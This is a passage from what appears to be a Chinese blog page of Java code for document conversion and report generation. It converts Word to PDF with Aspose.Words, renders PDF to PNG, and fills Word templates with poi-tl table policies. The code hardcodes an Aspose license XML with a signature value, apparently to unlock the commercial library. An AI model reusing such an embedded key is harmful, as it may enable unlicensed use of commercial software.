&lt;/Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        sNLLKGMUdF0r8O1kKilWAGdgfs2BvJb/2Xp8p5iuDVfZXmhppo+d0Ran1P9TKdjV4ABwAgKXxJ3jcQTqE/2IRfqwnPf8itN8aFZlV3TJPYeD3yWE7IT55Gz6EijUpC7aKeoohTb4w2fpox58wWoF3SNp6sK6jDfiAUGEHYJ9pjU=\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"&lt;/License>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//            is = new FileInputStream("C:\\Users\\Administrator\\Desktop\\tool\\license.xml");</span>        is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>licenseStr<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        License license <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            license<span class="token punctuation">.</span><span class="token function">setLicense</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">long</span> old <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            FileOutputStream os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>targetFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>Document doc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>Document</span><span class="token punctuation">(</span>sourceFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            doc<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>os<span class="token punctuation">,</span> com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>SaveFormat<span class="token punctuation">.</span>PDF<span class="token punctuation">)</span><span class="token punctuation">;</span>            os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">long</span> now <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"共耗时："</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>now <span class="token operator">-</span> old<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000.0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//转化用时</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"word转pdf 报告生成异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"报告生成失败！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//pdf转图片</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">pdf2Image</span><span class="token punctuation">(</span>String sourceFile<span class="token punctuation">,</span> String targetFile<span class="token punctuation">)</span> <span class="token punctuation">{</span>        File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>sourceFile<span class="token punctuation">)</span><span class="token punctuation">;</span>        PDDocument pdDocument<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            pdDocument <span class="token operator">=</span> PDDocument<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>            PDFRenderer renderer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDFRenderer</span><span class="token punctuation">(</span>pdDocument<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/* dpi越大转换后越清晰，相对转换速度越慢 */</span>            File dstFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>targetFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            BufferedImage image <span class="token operator">=</span> renderer<span class="token punctuation">.</span><span class="token function">renderImageWithDPI</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ImageIO<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>image<span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">,</span> dstFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"PDF文档转PNG图片成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//html转换PDF等更多PDF操作可看itextpdf</span><span class="token punctuation">}</span></code></pre><h3 id="填充Word内容"><a href="#填充Word内容" class="headerlink" title="填充Word内容"></a>填充Word内容</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>collection<span class="token punctuation">.</span>CollectionUtil<span class="token punctuation">;</span><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>date<span class="token punctuation">.</span>DateUtil<span class="token punctuation">;</span><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>UUID<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>XWPFTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>config<span class="token punctuation">.</span>Configure<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>config<span class="token punctuation">.</span>ConfigureBuilder<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>plugin<span class="token punctuation">.</span>table<span class="token punctuation">.</span>LoopRowTableRenderPolicy<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>plugin<span class="token punctuation">.</span>table<span class="token punctuation">.</span>MultipleRowTableRenderPolicy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CreateCreditReportUtil</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 生成word 文档报告     *     * @param rootPath           文件保存目录     * @param templatePath       模板文件地址     * @param rowDataCodeList    行数据项     * @param columnDataCodeList 列数据项     * @param paramMap           报告生成的Map数据项     * @return 返回报告生成的保存地址     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">downloadWord</span><span class="token punctuation">(</span>String rootPath<span class="token punctuation">,</span> String templatePath<span class="token punctuation">,</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> paramMap            <span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> rowDataCodeList<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> columnDataCodeList<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String fileTimestamp <span class="token operator">=</span> DateUtil<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"yyyyMMddHHmmss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 生成的word格式</span>        String formatSuffix <span class="token operator">=</span> <span class="token string">".docx"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 拼接后的文件名</span>        String fileName <span class="token operator">=</span> fileTimestamp <span class="token operator">+</span> UUID<span class="token punctuation">.</span><span class="token function">fastUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> formatSuffix<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        //设置生成的文件存放路径，可以存放在你想要指定的路径里面</span><span class="token comment" spellcheck="true">//        String rootPath="C:\\Users\\Administrator\\Desktop\\测试信用报告生成\\word\\";</span><span class="token comment" spellcheck="true">//         rootPath="C:\\Users\\Administrator\\Desktop\\";</span>        String filePath <span class="token operator">=</span> rootPath <span class="token operator">+</span> fileName<span class="token punctuation">;</span>        File reportFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//判断目标文件所在目录是否存在</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>reportFile<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//如果目标文件所在的目录不存在，则创建父目录</span>            reportFile<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//渲染表格  动态行</span>        ConfigureBuilder builder <span class="token operator">=</span> Configure<span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Configure config<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>CollectionUtil<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>rowDataCodeList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            HackLoopTableHtmlTextRenderPolicy policy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HackLoopTableHtmlTextRenderPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            rowDataCodeList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>x <span class="token operator">-</span><span class="token operator">></span> builder<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> policy<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>CollectionUtil<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>columnDataCodeList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            MultipleRowTableRenderPolicy multipleRowTableRenderPolicy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MultipleRowTableRenderPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            columnDataCodeList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>x <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                builder<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> multipleRowTableRenderPolicy<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>CollectionUtil<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>rowDataCodeList<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> CollectionUtil<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>columnDataCodeList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ConfigureBuilder configureBuilder <span class="token operator">=</span> <span class="token function">initConfig</span><span class="token punctuation">(</span>builder<span class="token punctuation">)</span><span class="token punctuation">;</span>            config <span class="token operator">=</span> configureBuilder<span class="token punctuation">.</span><span class="token function">useSpringEL</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>                    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            config <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">useSpringEL</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>                    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 读取模板templatePath并将paramMap的内容填充进模板，即编辑模板(compile)+渲染数据(render)</span>        XWPFTemplate template <span class="token operator">=</span> XWPFTemplate<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>templatePath<span class="token punctuation">,</span> config<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>paramMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//out = new FileOutputStream(filePath);//输出路径(下载到指定路径)</span>            <span class="token comment" spellcheck="true">// 将填充之后的模板写入filePath</span>            template<span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将template写到OutputStream中</span>            template<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> filePath<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"生成报告失败！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 初始化要渲染的数据     * @Author: CZM     * @Param: [builder]     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> ConfigureBuilder <span class="token function">initConfig</span><span class="token punctuation">(</span>ConfigureBuilder builder<span class="token punctuation">)</span> <span class="token punctuation">{</span>        MultipleRowTableRenderPolicy policy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MultipleRowTableRenderPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        LoopRowTableRenderPolicy loopPolicy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LoopRowTableRenderPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        builder                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"syjzfxpc.qlqy"</span><span class="token punctuation">,</span> policy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"xxzsxhy.professional.professional"</span><span class="token punctuation">,</span> policy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"wffxpc.fmjl.saqkfxpc.jsonArray"</span><span class="token punctuation">,</span> policy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"gdxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"zyry.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"qydwtz.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"fzjg.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"bgjl.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"zwrzList.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"sxbzxr.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"sx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"ktgg.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"pledge.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"xzcf.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"xzxk.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"swxy.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"tender.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"zpxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"jckxy.data"</span><span class="token punctuation">,</span> policy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"hbcf.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"gsrzxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"zyry.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"sbxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"zlxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"zsxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"copyright.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"rjzzq.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"wzxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"wxgzh.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"cpws.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"fygg.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"sfpm.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"drfddbr.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"dwtz.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"xzgxf.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"sjkzr.Names"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"sswf.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"tcdy.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"qsxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"tddy.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"dbxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"jyzxxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"bond.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"zbaj.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"xzgxf.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"sfaj.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"ycjy.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"check.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"jyzxxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"qsxx.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"sfxz.data"</span><span class="token punctuation">,</span> loopPolicy<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">useSpringEL</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setValidErrorHandler</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HyphenHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> builder<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="Word表格中循环插入数据"><a href="#Word表格中循环插入数据" class="headerlink" title="Word表格中循环插入数据"></a>Word表格中循环插入数据</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ObjectUtil<span class="token punctuation">;</span><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>util<span class="token punctuation">.</span>StrUtil<span class="token punctuation">;</span><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HtmlUtil<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONObject<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>XWPFTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>exception<span class="token punctuation">.</span>RenderException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>policy<span class="token punctuation">.</span>RenderPolicy<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>render<span class="token punctuation">.</span>compute<span class="token punctuation">.</span>RenderDataCompute<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>render<span class="token punctuation">.</span>processor<span class="token punctuation">.</span>DocumentProcessor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>resolver<span class="token punctuation">.</span>TemplateResolver<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token 